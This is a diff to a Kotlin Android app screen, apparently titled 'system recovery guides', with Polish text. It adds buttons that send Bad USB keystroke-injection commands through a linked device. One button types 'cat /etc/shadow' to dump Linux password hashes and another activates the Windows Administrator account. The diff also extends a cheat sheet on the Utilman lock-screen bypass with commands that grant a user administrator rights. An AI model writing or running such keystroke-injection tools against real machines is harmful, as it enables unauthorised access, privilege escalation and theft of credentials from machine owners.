@@ -112,7 +112,7 @@ class SystemRecoveryGuidesActivity : AppCompatActivity() {
                 "  1. mount -o remount,rw /\n" +
                 "  2. passwd root\n" +
                 "  3. reboot\n\n" +
-                "📋 LINUX ZRSUT UŻYTKOWNIKÓW:\n" +
+                "📋 LINUX ZRZUT UŻYTKOWNIKÓW:\n" +
                 "  cat /etc/passwd\n" +
                 "  cat /etc/shadow\n\n" +
                 "🪟 WINDOWS UTILMAN HACK (Ominięcie hasła na lock screenie):\n" +
@@ -122,7 +122,8 @@ class SystemRecoveryGuidesActivity : AppCompatActivity() {
                 "  copy cmd.exe utilman.exe\n" +
                 "• Po restarcie na ekranie logowania kliknij Ułatwienia Dostępu:\n" +
                 "  net user Administrator NoweHaslo123!\n" +
-                "  net user"
+                "  net localgroup Administrators NazwaUzytkownika /add\n" +
+                "  net user Administrator /active:yes"
 
         val cheatCard = card()
         val cheatLayout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL }
@@ -149,6 +150,17 @@ class SystemRecoveryGuidesActivity : AppCompatActivity() {
             }
         }
         linuxLayout.addView(btnDumpUsers, verticalParams(dp(4)))
+
+        val btnDumpShadow = MaterialButton(this).apply {
+            text = "📋 Bad USB: Zrzut Hashy Shadow (cat /etc/shadow)"
+            setBackgroundColor(0xFF283545.toInt())
+            setTextColor(Color.WHITE)
+            setOnClickListener {
+                BruceBleIrLink.sendCustomCommand(this@SystemRecoveryGuidesActivity, "bu string \"cat /etc/shadow\"\nbu enter")
+                Toast.makeText(this@SystemRecoveryGuidesActivity, "Wysłano zrzut /etc/shadow przez Bad USB", Toast.LENGTH_SHORT).show()
+            }
+        }
+        linuxLayout.addView(btnDumpShadow, verticalParams(dp(4)))
 
         val btnSendLinux = MaterialButton(this).apply {
             text = "🚀 Bad USB: Wejdź w Single User Mode (mount + passwd)"
@@ -178,6 +190,17 @@ class SystemRecoveryGuidesActivity : AppCompatActivity() {
             }
         }
         winLayout.addView(btnDumpWinUsers, verticalParams(dp(4)))
+
+        val btnEnableAdmin = MaterialButton(this).apply {
+            text = "🔓 Bad USB: Aktywuj Konto Administratora"
+            setBackgroundColor(0xFF283545.toInt())
+            setTextColor(Color.WHITE)
+            setOnClickListener {
+                BruceBleIrLink.sendCustomCommand(this@SystemRecoveryGuidesActivity, "bu string \"net user Administrator /active:yes\"\nbu enter")
+                Toast.makeText(this@SystemRecoveryGuidesActivity, "Wysłano aktywację admina przez Bad USB", Toast.LENGTH_SHORT).show()
+            }
+        }
+        winLayout.addView(btnEnableAdmin, verticalParams(dp(4)))
 
         val btnSendWin = MaterialButton(this).apply {
             text = "🚀 Bad USB: Zmiana Hasła Administratora Windows"
